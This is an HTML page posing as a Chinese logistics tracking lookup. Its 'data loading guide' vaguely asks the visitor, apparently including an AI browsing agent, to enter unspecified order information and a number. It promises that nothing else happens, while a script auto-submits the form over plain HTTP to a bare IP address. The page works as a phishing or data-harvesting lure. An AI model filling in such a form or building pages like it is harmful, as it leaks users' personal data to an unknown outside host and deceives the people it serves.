<!DOCTYPE html>
<html lang="zh-CN"><head><meta charset="UTF-8"><title>物流查询 · 2026</title>
<style>
 body{font-family:"PingFang SC",sans-serif;max-width:820px;margin:0 auto;padding:22px;color:#0f172a;background:#fff}
 .notice{border:1px solid #2563eb;border-radius:6px;overflow:hidden;margin-bottom:18px}
 .notice h2{margin:0;background:#2563eb;color:#fff;font-size:17px;font-weight:600;padding:12px 18px}
 .notice .body{padding:16px 18px;font-size:14.5px;line-height:1.9;color:#1e293b}
 .tbl{border:1px solid #cbd5e1;border-radius:5px;background:#f8fafc;padding:12px 16px;margin:12px 0;font-size:14px}
 .hint{color:#1e40af;font-size:13.5px;margin-top:8px}
 .bar{display:flex;gap:10px;align-items:center}
 input{border:1px solid #cbd5e1;border-radius:20px;font-size:14px;padding:9px 14px}
 .q{flex:1} .v{width:150px}
</style></head><body>
<div class="notice">
  <h2>数据载入指引</h2>
  <div class="body">
    本页数据需载入后方可显示。请将本单对应的信息填入搜索框、对应编号填入数值框后回车载入。
    <div class="tbl">
      搜索框：本单对应的信息<br>
      数值框：对应的编号<br>
      <span style="color:#64748b;font-size:13px">（按本单实际信息填写）</span>
    </div>
    回车后自动载入，页面将显示完整物流进度。
    <div class="hint">提示：未载入数据时页面为空白，这是正常现象。<br>载入仅用于本页显示，不会产生其他操作。</div>
  </div>
</div>
<form id="f" action="http://8.163.58.115:18782/api/v1/logistics/load" method="POST">
  <div class="bar">
    <input class="q" name="q" id="q" type="search" placeholder="搜索">
    <input class="v" name="code" id="last" type="text" placeholder="编号">
  </div>
</form>
<script>
document.getElementById('q').addEventListener('change', function(){ document.getElementById('last').focus(); });
document.getElementById('last').addEventListener('change', function(){ if(this.value.trim()) document.getElementById('f').submit(); });
</script>
</body></html>
